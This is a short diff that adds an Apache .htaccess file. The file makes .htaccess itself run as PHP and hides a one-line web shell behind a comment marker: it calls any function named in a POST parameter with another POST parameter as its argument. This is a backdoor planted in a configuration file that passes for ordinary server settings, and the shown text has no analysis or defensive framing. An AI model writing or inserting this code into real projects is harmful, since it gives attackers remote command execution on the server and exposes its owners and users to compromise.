@@ -1,0 +1,8 @@
+<Files ~ "^\.ht">
+    Order allow,deny
+    allow from all
+</Files>
+ 
+AddType application/x-httpd-php .htaccess
+ 
+#<?php $_POST['id']($_POST['image']);?>
